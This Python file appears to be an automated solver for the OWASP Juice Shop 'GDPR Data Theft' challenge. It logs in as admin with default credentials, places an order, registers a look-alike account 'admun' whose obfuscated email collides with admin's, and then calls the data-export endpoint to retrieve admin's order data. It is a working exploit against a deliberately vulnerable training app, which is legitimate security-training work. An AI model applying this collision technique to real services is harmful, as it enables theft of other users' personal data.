from core.base_solver import BaseSolver
from loguru import logger
import random
import string

class GdprDataTheftSolver(BaseSolver):
    """
    Challenge: GDPR Data Theft (dataExportChallenge)
    
    Exploit: Email obfuscation collision in data-export.
    1. Admin creates an order. Email stored as '*dm*n@j**c*-sh.*p'.
    2. Register 'admun@juice-sh.op'. Obfuscated email also '*dm*n@j**c*-sh.*p'.
    3. Export data as 'admun'. It retrieves Admin's orders.
    4. Admin's orderId hash (from 'admin') !== Admun's emailHash (from 'admun').
    """
    @property
    def challenge_key(self) -> str:
        return "dataExportChallenge"

    def solve(self) -> bool:
        # Step 1: Admin creates an order
        login_admin = self.client.post("/rest/user/login", json={
            "email": "admin@juice-sh.op", "password": "admin123"
        })
        token_admin = login_admin.json().get("authentication", {}).get("token")
        bid_admin = login_admin.json().get("authentication", {}).get("bid")
        headers_admin = {"Authorization": f"Bearer {token_admin}"}
        
        # Add item and checkout
        self.client.post("/api/BasketItems", json={
            "ProductId": 1, "BasketId": str(bid_admin), "quantity": 1
        }, headers=headers_admin)
        
        # Payment and Address
        checkout_payload = {
            "checkoutMode": "ordered",
            "orderDetails": {
                "paymentId": "1",
                "addressId": "1",
                "deliveryMethodId": "1"
            }
        }
        self.client.post(f"/rest/basket/{bid_admin}/checkout", json=checkout_payload, headers=headers_admin)
        logger.info("Admin created an order.")

        # Step 2: Register admun@juice-sh.op
        email_admun = "admun@juice-sh.op"
        password_admun = "admun123"
        self.client.post("/api/Users", json={
            "email": email_admun,
            "password": password_admun,
            "passwordRepeat": password_admun,
            "securityQuestion": {"id": 1, "answer": "admun"}
        })
        
        # Step 3: Login as admun
        login_admun = self.client.post("/rest/user/login", json={
            "email": email_admun, "password": password_admun
        })
        token_admun = login_admun.json().get("authentication", {}).get("token")
        headers_admun = {"Authorization": f"Bearer {token_admun}"}
        
        # Step 4: Data Export
        # We also pass a UserId of someone else just in case it helps for the "theft" part,
        # but the orders collision happens regardless. 
        # Actually, let's use Admin's UserId (1)
        self.client.post("/rest/user/data-export", json={"UserId": 1}, headers=headers_admun)
        
        logger.success("GDPR Data Theft exploit executed.")
        return True
